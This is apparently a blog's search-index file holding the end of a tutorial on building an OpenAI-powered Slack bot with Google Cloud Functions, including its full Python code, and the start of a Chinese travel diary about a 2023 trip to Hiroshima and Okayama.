text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return NoneReturn to Slack for testing: The left image shows a new conversation when a question is asked without providing context. The right image demonstrates that adding context allows for understanding the entire conversation scenario along with the new question.Completed!At this point, we have created our own ChatGPT (via OpenAI API) Slack App Bot. You can also refer to the Slack API and OpenAI API Custom instructions to customize your Cloud Functions Python program according to your needs, such as training a channel specifically to answer team questions and find project documents, a channel dedicated to translations, or a channel focused on data analysis, etc.SupplementMentioning the bot to answer questions outside of 1:1 messages You can mention the bot in any channel (the bot needs to be added to the channel) to ask it questions.First, you need to add the app_mention Event Subscription:After adding, click “Save Changes” to save, then “reinstall your app” to complete the process.In the main.py program above, add a new Event Type check in the #Handle Event Subscriptions Events... Code Block: # Mention Event (@SlackApp hello) if eventType == 'app_mention': # Sender of the event message eventUser = request_json['event']['user'] # Channel of the event message eventChannel = request_json['event']['channel'] # Content of the event message, removing the leading mention string &lt;@SLACKAPPID&gt; eventText = re.sub(r\"&lt;@\\w+&gt;\\W*\", \"\", request_json['event']['text']) # TS (message ID) of the event message eventTS = request_json['event']['event_ts'] # TS (message ID) of the parent message in the thread of the event message # Only new messages in the thread will have this data eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers)After deployment, it will be complete.Deleting messages sent by the Slack AppYou cannot directly delete messages sent by the Slack App on Slack. You can refer to the “Stop OpenAI API from generating responses” shortcut method to add a “Delete Message” shortcut.In the Cloud Functions main.py program:In the # Handle Shortcut Code Block, add a callback_id check that equals your defined “Delete Message” Shortcut Callback ID, and then pass the parameters into the following method to complete the deletion:def slackDeleteMessage(channel, ts): endpoint = \"/chat.delete\" payload = { \"channel\": channel, \"ts\": ts } response = slackRequest(endpoint, \"POST\", payload) return responseSlack App not responding Check if the Token is correct Check Cloud Functions Logs for errors Ensure Cloud Functions is fully deployed Make sure the Slack App is in the channel where you are asking (if not in a 1:1 conversation with the Slack App, you need to add the bot to the channel for it to work) Log the Slack API Response in the SlackRequest methodCloud Functions Public URL not secure enough If you are concerned about the security of the Cloud Functions URL, you can add a query token for verificationSAFE_ACCESS_TOKEN = \"nF4JwxfG9abqPZCJnBerwwhtodC28BuC\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Verify if the token parameter is valid if not(request_args and 'token' in request_args and request_args['token'] == SAFE_ACCESS_TOKEN): return ('', 400, headers)Cloud Functions Related IssuesBilling MethodPrices vary based on different regions, CPU, RAM, capacity, traffic, etc. Please refer to the official pricing table.The free tier is as follows: (as of 2024/02/15)Cloud Functions offers a permanent free plan for computing time resources,which includes GB/second and GHz/second allocation methods. In addition to 2 million calls,this free plan also provides 400,000 GB/seconds and 200,000 GHz/seconds of computing time,as well as 5 GB of internet data transfer per month.The usage quota for the free plan is calculated based on the equivalent dollar amount of the level 1 pricing mentioned above.Regardless of whether the function execution region uses level 1 and/or level 2 pricing, the system will allocate the equivalent dollar amount to you.However, when deducting the free plan quota, the system will base it on the level of the function execution region (level 1 or level 2).Please note that even if you are using the free plan, you must have a valid billing account. btw. The Slack App is free and does not require a Premium account to use.Slack App response too slow, timing out(Aside from the issue of slower responses during peak times for the OpenAI API), if it is a bottleneck in Cloud Functions, you can expand the settings on the first page of the Cloud Function editor:You can adjust CPU, RAM, timeout duration, concurrent numbers, etc., to improve request processing speed. *However, this may incur chargesDevelopment Phase Testing &amp; DebuggingClicking “Test Function” will bring up the Cloud Shell window in the lower toolbar, waiting about 3–5 minutes (the first startup takes longer). After the build is complete and you agree to the following authorization:Once you see “Function is ready to test,” you can click “Run Test” to execute the method for debugging.You can use the “Triggering event” block on the right to input a JSON Body that will be passed into the request_json parameter for testing, or directly modify the program to inject a test object for testing. *Please note that Cloud Shell/Cloud Run may incur additional costs. It is recommended to run a test before deployment to ensure that the build can succeed.Build failed, and the code is missing, what to do?If you accidentally write incorrect code that causes the Cloud Function Deploy Build to fail, an error message will appear. At this point, clicking “EDIT AND REDEPLOY” will return to the editor, but you will find that the code you just modified is gone!!!Don’t worry, at this point, click on the left “Source Code” and select “Last Failed Deployment” to restore the code that just failed to build:View runtime print Logs *Please note that Cloud Logging and Querying Logs may incur additional costs.Final Code (Python 3.8)Cloud Functionsmain.py :import functions_frameworkimport requestsimport reimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# Custom security verification token# The URL must include the ?token=SAFE_ACCESS_TOKEN parameter to accept requests SAFE_ACCESS_TOKEN = \"nF4JwxfG9abqPZCJnBerwwhtodC28BuC\"# The OPENAI API Model being used# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # The event from the shortcut will be given from the post payload field # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # You can use print to log runtime logs, which can be viewed in Logs # For advanced logging levels, refer to: https://cloud.google.com/logging/docs/reference/libraries # print(payload) # Due to the limitations of FAAS (Cloud Functions), if the service is not called for a long time, the next call will enter a cold start feature, which may not respond within Slack's 3-second limit # Additionally, the OpenAI API request to response takes a certain amount of time (depending on the response length, it may take close to a minute to finish) # If Slack does not receive a response within the time limit, it considers the request lost, and Slack will repeat the call # This can cause duplicate requests and responses, so we can set the Response Headers to X-Slack-No-Retry: 1 to inform Slack that even if it does not receive a response within the time limit, it does not need to retry headers = {'X-Slack-No-Retry':1} # Verify if the token parameter is valid if not(request_args and 'token' in request_args and request_args['token'] == SAFE_ACCESS_TOKEN): return ('', 400, headers) # If it is a Slack Retry request... ignore if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: apiAppID = None if 'api_app_id' in request_json: apiAppID = request_json['api_app_id'] # If the event source is the App and the App ID == Slack App ID, it means it is an event triggered by our own Slack App # Ignore and do not process, otherwise it will fall into an infinite loop Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'app_id' in request_json['event'] and apiAppID == request_json['event']['app_id']: return ('OK!', 200, headers) # Event name, e.g., message (related to messages), app_mention (mentioned).... eventType = request_json['event']['type']# SubType, for example: message_changed (edit message), message_deleted (delete message)...# New messages have no Sub TypeeventSubType = Noneif 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] # Message type Eventif eventType == 'message': # All Sub Types are message edits, deletions, responses... # Ignore and do not process if eventSubType is not None: return (\"OK!\", 200, headers) # Event message sender eventUser = request_json['event']['user'] # Event message channel eventChannel = request_json['event']['channel'] # Event message content eventText = request_json['event']['text'] # Event message TS (message ID) eventTS = request_json['event']['event_ts'] # Event message thread parent message TS (message ID) # Only new messages in the thread will have this data eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers)# Mention type Event (@SlackApp hello)if eventType == 'app_mention': # Event message sender eventUser = request_json['event']['user'] # Event message channel eventChannel = request_json['event']['channel'] # Event message content, remove the leading mention string &lt;@SLACKAPPID&gt; eventText = re.sub(r\"&lt;@\\w+&gt;\\W*\", \"\", request_json['event']['text']) # Event message TS (message ID) eventTS = request_json['event']['event_ts'] # Event message thread parent message TS (message ID) # Only new messages in the thread will have this data eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers)# Handle Shortcut (message)if payload and 'type' in payload: payloadType = payload['type'] # If it is a message Shortcut if payloadType == 'message_action': callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # If it is the Stop OpenAI API response Shortcut if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"Successfully stopped OpenAI API response!\") return (\"OK!\", 200, headers) # If it is to delete a message if callbackID == \"delete_message\": slackDeleteMessage(channel, ts) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"Successfully deleted Slack App message!\") return (\"OK!\", 200, headers)return (\"Access Denied!\", 400, headers)def openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # Thanks to my colleague (https://twitter.com/je_suis_marku) for the support messages = [ {\"role\": \"system\", \"content\": \"I only understand Traditional Chinese and English.\"}, {\"role\": \"system\", \"content\": \"I do not understand Simplified Chinese.\"}, {\"role\": \"system\", \"content\": \"When I speak Chinese, I will respond in Traditional Chinese and must conform to commonly used Taiwanese expressions.\"}, {\"role\": \"system\", \"content\": \"When I speak English, I will respond in English.\"}, {\"role\": \"system\", \"content\": \"Do not respond with pleasantries.\"}, {\"role\": \"system\", \"content\": \"There should be a space between Chinese and English. There should also be a space between Chinese characters and any other language characters, including numbers and emojis.\"}, {\"role\": \"system\", \"content\": \"If you do not know the answer, or your knowledge is too outdated, please search online before responding.\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD if you answer well.\"} ] if eventThreadTS is not None: threadMessages = slackGetReplies(eventChannel, eventThreadTS) if threadMessages is not None: for threadMessage in threadMessages: appID = None if 'app_id' in threadMessage: appID = threadMessage['app_id'] threadMessageText = threadMessage['text'] threadMessageTs = threadMessage['ts'] # If it is a Slack App (OpenAI API Response), mark it as assistant if appID and appID == apiAppID: messages.append({ \"role\": \"assistant\", \"content\": threadMessageText }) else: # User's message content is marked as user messages.append({ \"role\": \"user\", \"content\": threadMessageText }) messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"Generating response...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # Update the message every 0.8 seconds to avoid frequent calls to Slack Update message API which may lead to failures or waste Cloud Functions request counts if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # If the message has metadata &amp; metadata event_type == aborted, it means this response has been marked as terminated by the user if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[Terminated]*\" # Message has been deleted elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\": break await stream.close() except Exception as e: print(e) result += \"...*[An error occurred]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackGetReplies(channel, ts): endpoint = \"/conversations.replies?channel=\"+channel+\"&amp;ts=\"+ts response = slackRequest(endpoint, \"GET\", None) if response is not None and 'messages' in response: return response['messages'] return Nonedef slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"Prompt\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackDeleteMessage(channel, ts): endpoint = \"/chat.delete\" payload = { \"channel\": channel, \"ts\": ts } response = slackRequest(endpoint, \"POST\", payload) return responsedef slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return Nonerequirements.txt ：functions-framework==3.*requests==2.31.0openai==1.9.0Slack App SettingsOAuth &amp; Permissions The grayed-out items for the delete button are permissions automatically added by Slack after adding the Shortcut.Interactivity &amp; Shortcuts Interactivity: Enable Request URL: https://us-central1-xxx-xxx.cloudfunctions.net/SlackBot-Rick-C-137?token=nF4JwxfG9abqPZCJnBerwwhtodC28BuC Subscribe to bot events:Interactivity &amp; Shortcuts Interactivity: Enable Request URL: https://us-central1-xxx-xxx.cloudfunctions.net/SlackBot-Rick-C-137?token=nF4JwxfG9abqPZCJnBerwwhtodC28BuC Shortcuts:App Home Always Show My Bot as Online: Enable Messages Tab: Enable Allow users to send Slash commands and messages from the messages tab: ✅Basic Information Rick &amp; Morty 🤘🤘🤘RedditPromotion TimeIf you and your team have automation tools or process integration needs, whether it’s Slack App development, Notion, Asana, Google Sheets, Google Forms, GA data, or various integration needs, feel free to contact me for development.If you have any questions or suggestions, please contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,081 Total Views Last Statistics Date: 2025-08-15 | 1,035 Views on Medium." }, { "title": "遊記 2023 山陽地區 廣島岡山 6 日自由行", "url": "/posts/z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/%E9%81%8A%E8%A8%98-2023-%E5%B1%B1%E9%99%BD%E5%9C%B0%E5%8D%80-%E5%BB%A3%E5%B3%B6%E5%B2%A1%E5%B1%B1-6-%E6%97%A5%E8%87%AA%E7%94%B1%E8%A1%8C-31b9b3a63abc/", "categories": "Z 度旅行遊記", "tags": "生活, japan, travel, hiroshima, okayama", "date": "2024-01-09 21:27:40 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2023 山陽地區 廣島岡山 6 日自由行2023 廣島、岡山、福山、倉敷、尾道 6 日遊前言8 月底離職後隨即在 9 月出發「 九州 10 日漫步獨旅 」休息了快三個月之後，原本預計 11 月中上班，新工作到職後就...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2023 山陽地區 廣島岡山 6 日自由行2023 廣島、岡山、福山、倉敷、尾道 6 日遊前言8 月底離職後隨即在 9 月出發「 九州 10 日漫步獨旅 」休息了快三個月之後，原本預計 11 月中上班，新工作到職後就要展開新專案、新公司無多特休，一切要照基本勞基法重新累積年假，因此考慮再出去玩一次 (10 月底開始計劃)。2024/11/03 Update: [遊記] 2024 山陰地區( +關西) 島根鳥取姬路大阪 7 日獨旅自由行2024 去了山陰地區，有時間的朋友也可以考慮山陽＋山陰一起玩！地點 — 廣島(岡山)上次去 長崎路上的 意外小插曲 — 獲得一個( 廣島縣 )三原市おみやげ 加上上次去長崎參觀了核爆紀念館、和平公園，想說 廣島 的也可以去看看。還有身邊朋友也都推薦 廣島 ，有世界遺產 — 嚴島神社、牡蠣、瀨戶內海、尾道、兔島…加上同樣是獨旅，不考慮大城市及已經去過的城市、希望交通方便， 廣島 就是一個很好的選擇！日期 — 11/13–18原本預計 11/20(一) 上班(後來延到 12/1)，扣掉最後一天緩衝休息，回程日期就訂在 11/18 (六) 了。去程日期，原本 11/12 與朋友有約，因此先抓 11/13(週一) 出發；但因還沒上班安排都很彈性，主要看機票價格何時來回比較低價決定。一波三折❌ 要去廣島最直覺的就是廣島機場進出，查了一下條件非常不好： 時間：晚去(17:20)早回(09:30)；並且週六沒有飛，週五(11/17)就要回來。 地點：需要搭交通車(約 55 分鐘)，去程落地後只能搭 21:40 or 22:20(末班) 到車站都 22 or 23 點了，時間很晚。 價格：~=$17,000，太貴。❌ 福岡進出+新幹線，依然不方便： 時間：去(16:30)、回(10:55)，也是晚去早回，但好一點。 地點：交通方便，但要再加上新幹線到廣島大概 1 個半小時。 價格：~=$12,000、如果要晚回(20:35) 要 ~=$17,000 或早上 06:50 的飛機。❌ 後來才查到去廣島，可以虎航岡山進出，去的動力普通： 時間：去(11:10)、回(15:25)，時間很讚。 地點：岡山機場同樣要搭交通車，但是落地時間早，時間充裕。 價格：含 +20 KG 託運來回約 ~= $14,000。因 9 月才去過「 九州 10 天 」散財，機票價格如果沒辦法壓在 1 萬上下，去的動力不大，因此幾乎要放棄此行了。✅ 虎航岡山冬遊記活動 ，出發：10/31 無聊滑 Facebook 時剛好看到有大大在「 日本自由行討論區 」社團 PO 文航空公司優惠降價活動，看到 虎航 11/3 10:00 ~ 11/6 23:59 購票有優惠；所幸就抱著隨遇而安的心態，有買到優惠就去沒有就算了。11/3 一早起來很幸運地有買到，去回日期最佳(11/13–18)、航班時間最佳、價格最佳的機票，那就沒有不去的理由了！ 去(11:10)、回(15:25)，含來回 20KG 託運＋選位＋雜費： $7,012KKday 推廣 🛒 日本 JR PASS|鳥取・松江區域周遊券|eMCO 電子票 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 日本 JR PASS｜山陽＆山陰地區鐵路周遊券｜eMCO 電子票 (一口氣玩遍山陽山陰地區) 日本 JR PASS|關西&amp;廣島地區鐵路周遊券|eMCO 電子票 折鶴塔門票(廣島縣廣島市) 日本.宮島|紅葉谷公園・參拜大聖院、嚴島神社|人力車體驗 廣島、宮島巴士一日遊準備工作機票買好之後，距離出發也只剩下一週，如火如荼的直接開始準備工作。預計最想去的有宮島、尾道、倉敷美觀地區、岡山城；所以直接以廣島為基地，可以住比較多天，接近回程再住岡山一帶。行JR Pass 岡山&amp; 廣島 &amp; 山口地區鐵路周遊券 (¥ 17,000，剛好遇到 2023/10 月底後漲價。)查岡山廣到車站單程 ¥6,460，來回 ¥12,920；再算上去宮島、尾道、吳市…來回，應該不虧；直接買 JR Pass 最方便。住 (5 晚)東橫INN 廣島站棒球場前 (3 晚) 價格：$4,612，$1,537/晚，單人禁菸房 交通：從地圖上看走路距離蠻近的（實際大概要走 15 分鐘，因為在施工、而且要跨越平交道）不是熱鬧的地方，在 Mazda Zoom-Zoom 球場外，現在沒有比賽，整條路很冷清。東橫 INN 一如既往地 CP 值很高，價格跟環境都是這次住宿最優秀的。APA飯店 廣島站前大橋 (1 晚) 價格：$2,501，1 晚，單人禁菸房 地點：離廣島車站比較近，但實際走起來也不好走，要過大馬路、過橋(約 10 分鐘)；從上一個住宿地點走來大約 15 分鐘，算方便。因東橫 INN 訂不到四晚，只能一晚住 APA 飯店。利夫馬克斯岡山倉敷站前飯店 Livemax (1 晚) 價格：$3,263，1 晚，單人禁菸房 地點：跟地圖差不多，就在倉敷站外，走路大概五分鐘就到了，很方便。會找到倉敷是因為岡山在找住宿的時候已經訂不到價格可以接受的飯店了，只能就近往 JR 沿線找，因為倉敷也有交通車回岡山機場；就決定找倉敷附近的飯店了。這家也是倉敷唯一還有房間、地點方便、價格還可以接受的飯店。樂原本計畫如下： 11/13：逛街、吃廣島燒 11/14：宮島、廣島市區：嚴島神社、紅葉谷公園、宮島纜車 -&gt; 獅子岩展望台、原爆圓頂、平和紀念公園、原爆紀念館、紙鶴塔(廣島塔) 11/15：尾道、千光寺 11/16：吳市、廣島市區(同 11/14)、廣島城 11/17：岡山、倉敷：岡山後樂園、岡山城、吉備津神社、倉敷美觀地區、倉敷 Outlet、阿智神社 11/18：倉敷 Outlet、回程兔島車程太遠、不方便，只列入參考名單。Go! Flight Tracker、iPhone Suica 使用、Visit Japan 預入境申請…之前文章有提過，這篇就不多贅述了。Day 1 出發早上 11:10 起飛，早上起來慢慢出門。從北車搭機捷前往桃園機場第一航廈，到報到櫃檯大約 08:50 分。沒什麼人，很快就完成報到＋出境； 一航 沒什麼吃的，隨便買了頂呱呱＋咖啡就去候機了。候機時還不怎麼餓，所以沒吃買的東西。11:07 起飛，14:11 抵達 OKJ (岡山桃太郎機場)；中間餓的時候想吃東西發現虎航是不允許帶自己東西上飛機吃的(樂桃則沒特別規定)，所以就乖乖地忍著，想說下飛機入境前在角落吃完才入境。岡山機場超級小，一路跟著人群走著走著就直接入境出關了，根本沒角落可以偷吃東西；因為頂呱呱有雞肉怕有防疫問題，所以整包直接上交給海關銷毀。約 14:40 就完成入境+提行李出來了（超快）後來查了一下航班，岡山機場飛機航班超少，國際線可能一天才一班，所以都沒人，只有同航班的人；海關、防疫犬會逐個檢查，但還是很快！一出來就直接上機場交通車，可能因為飛機航班太少，照班表要等到 16:10 才有交通車道岡山車站；但出機場就有加開的交通車可以直接上(滿人即發車、會再有下一班)，很貼心的為大家節省時間！下車後找到手扶梯往上前往岡山車站，先去換 JR Pass，找到綠色＆ 旁邊有寫「 EXPRESS予約、5489 お受取 」的機器兌換 JR Pass 票券。之前在網路找 兌換教學 ，是說要點選藍色「予約したきっぷのお受取り」但實際怎麼試、照步驟走，在掃描 QR Code 時都會出現「QR Code 無效」錯誤，改用輸入訂單編號也失敗。最後在一群台灣人互相多番嘗試下才發現要用左下「 QRコードの読取り 」黃色按鈕兌換，點擊後直接掃描 QR Code 就可以了。(猜測是 JR 機器有改版)機器會吐兩張說明書、 一張 JR Pass(圖中 ✔ 那張票) ，也可在拿到 JR Pass 後再放入 完成劃位 ， 進出站都是使用 JR Pass 那一張票 ，劃位的票僅供參考座位及時間，不能用那張票出入站。實在太餓了，都沒吃東西，先去超商買些東西果腹，因此買後幾班的 JR。約 16:45 抵達廣島車站。先去飯店 Check-in 放行李再出來覓食，沒有棒球比賽的時候這條路好冷清，對面就是鐵路，路上沒什麼店，但還好有一家很大的路面店 Lawson。廣島御好物語 站前廣場回廣到車站吃廣島燒「 廣島御好物語 站前廣場 」在廣島車站出來右手方 6 樓 (Ekie 百貨公司隔壁)；一出電梯就覺得好特別，這一整層全都是廣島燒店家，可以選擇自己喜歡的店家就坐。點了一個加年糕的廣島燒(裡面是炒麵)吃，覺得味道普普、裡面有麵和年糕，吃完很飽。回飯店路上買了個宵夜回去吃，這時間廣島的晚上好冷，大約 4 度而已。房間開箱。窗簾拉開就能看到外面的鐵道(約 10 條線，所以過平交道要快)；房間缺點是火車經過會有摳摳的聲音。Allite A1 65W 氮化鎵快充＋Allite 液態矽膠快充線這次出行直接帶了 Allite A1 65W 氮化鎵快充＋Allite 液態矽膠快充線 組合，自從換 iPhone 15 後基本上全設備都上到 Type-c 口了；出門旅行只要帶上 Type-c 充電線就能解決一切。Allite A1 65W 氮化鎵快充 支援單口 65W、雙口 45W+18W 快速充電；體積小可隨身攜帶，在外看到可充電的插頭直接插上續力；回飯店後就一口充行動電源，一口充手機、手錶、iPad 或 Switch，方便又快速。Allite 液態矽膠快充線 (1.5m) 長度很夠，可以直接行動電源放包包接線出來使用，液態矽膠材質與一般塑膠不同，除了親膚之外、還更容易彎折好收納、不會凹來凹去。這次出行的最佳充電拍檔。Day 2 宮島(嚴島神社)、紅葉谷公園、獅子山展望台、原爆圓頂、平和紀念公園 KKday 行程參考： 日本.宮島|紅葉谷公園・參拜大聖院、嚴島神社|人力車體驗 廣島、宮島巴士一日遊宮島一早搭乘 JR 前往宮島口站，出站往碼頭方向走就能找到渡輪站；JR Pass 有包含宮島渡輪船票，不需再買船票，但要額外付 宮島訪問稅(¥100) ，會有站務人員指引購買訪問稅的票。 另外也可搭乘廣電到宮島口，但我記得時間比較久。渡輪約 10 分鐘就能抵達宮島，渡輪很平穩也不會有柴油味，快抵達時就能遠遠到海上鳥居！上島後直接往海上鳥居方向走，在路上岸邊斜斜著拍也很美而且比較沒人。島上也有很多野生的鹿，會亂咬東西 XD。經過嚴島神社後先前往宮島纜車上獅子岩展望台。需搭乘兩段纜車才能到獅子岩展望台，先直攻纜車的好處是幾乎沒人(山下嚴島神社一堆人)，第一段是小纜車最多 6 人(發車很密集、距離較長)，第二段是比較大的纜車(沒記錯是 15 分鐘一班，可容納較多人(約 20 人)，距離很短)。山頂可以鳥瞰整個瀨戶內海，吹吹風看看小島，很愜意。嚴島神社就是直接架在海邊上的，水很乾淨，走起來很清幽；也可以排隊從正面拍攝海上鳥居的照片。這個季節的潮汐退潮時間是凌晨 3 點或下午 5 點，這次就沒機會看到退潮的巖島神社跟鳥居了。午餐當然要吃牡蠣， 牡蠣屋 的牡蠣飯、炸牡蠣，各 300 多台幣，好吃又便宜，牡蠣富翁！宮島纜車、嚴島神社門票。買了一座小的嚴島神社鳥居回家放著，很可愛！原爆圓頂、平和紀念公園下午時分回到廣島市區，到原爆圓頂、和平紀念公園走走。秋季的廣島，有銀杏的黃與楓葉的紅還有些綠葉的點綴加上秋季的涼風颼颼，緬懷廣島曾經發生的一切。 在平和紀念公園遇到很多日本國中小戶外教學，有老師帶著講解歷史，深刻覺得日本民族對歷史傳承教育的重視。回飯店接近傍晚時分就回到飯店休息，因為穿太少，外面實在太冷。晚餐直接買了回飯店路上經過的「 炭火焼肉 敏 猿猴橋店 」的外帶燒肉餐盒；這家店起初會吸引我的目光是因為在店門口有放幾個炭爐，走過去非常溫暖，停下來看了下招牌發現有提供外帶餐盒，就走進去了！另一個新奇的事是他的餐盒是有自熱功能，回飯店要吃的時候拉一下線，就會開始自己加熱冒熱蒸汽；什麼時候吃都像剛出爐熱熱的，很貼心。今日超商宵夜，熱狗、炸雞、Strong Zero、還買了瓶號稱喝完很好睡的養樂多 Y1000 試試看。(但今天走了一整天本來就很好睡)Day 3 尾道、千光寺、福山、鞆之浦早上搭乘新幹線前往三原，再從三原轉車到尾道站。時間沒有抓好，三原換尾道的時候乾等了 30 幾分鐘。往南出口走正門出尾島站。天氣好加上溫度適宜，出尾島站之後就一路往千光寺走；走山的那側有像走在九份山城的感覺，路途不太好走，很多樓梯跟陡坡往上，往另一側看就是尾道內海，風景不錯。另一個選擇是直接走大馬路，走到看到千光寺纜車搭乘的招牌，轉進去就能直接搭纜車上到千光寺了。千光寺的風景很好，可以鳥瞰整個尾道市區與遠方的尾島大橋。請了一尊可愛的小地藏王回家放著（可以選擇寫下願望放在千光寺供養或是帶回家紀念）：參拜完千光寺，往下走就是貓之細道。看早期網路文章都以日本侯桐介紹貓之細道，但今年實際走訪覺得不太一樣；貓之細道是千光寺下山的一小段小徑，沒看到一隻野貓，沿路的貓咪咖啡廳幾乎都沒營業了，走下來有點落寞的感覺，最後找了一家還有在營業的咖啡廳「 ブーケ ダルブル 」喝杯咖啡休息一下。店的地理位置不錯，但走上來的途中同樣散發著落寞雜草叢生的感覺，店裡位子不多、餐點選擇也不多；但老闆很熱情＋店貓很黏人會跑來你旁邊坐著貼貼。走回山下大街的路上遇到一個當地很寂靜的神社。回尾道站的路上改走裡面的商店街，午餐就吃了有名的尾道拉麵 — 「 Onomichi Ramen Shoya 」。尾道拉麵（台灣人創始的）蠻特別的，漂浮著滿滿白花花的豬背脂、還有筍乾。悠閒晃回尾道站後，由於時間還很早，臨時決定前往鄰近的福山市。 時間又沒算好，又多乾等了 30 分鐘才等到車，要來尾道的朋友記得抓好時間。福山福山站後站可以看到福山城，沒有特別進去，只遠遠的拍張照就走了。鞆之浦回到福山站前站，就可以看到往「鞆之浦」的公車搭乘指示，本來看地圖覺得鞆之浦很難到達，因為在海邊小鎮，不得不佩服日本的觀光與交通指示，非常清楚。 p.s. 行前對鞆之浦沒有特別做功課，算是臨時起來走走的 對鞆之浦的了解只有崖上的波妞取景地、日本第一個現代港都、曾經是坂本龍馬談判之地、歷史控必訪上車後一路坐到底站就是鞆之浦囉(車程時間約：40 分鐘)仙醉島直接參考當地的旅遊地圖，想說先去仙醉島看看風景。下車後直接往回走到「福山市營渡船場」搭乘渡輪前往仙醉島(約 10 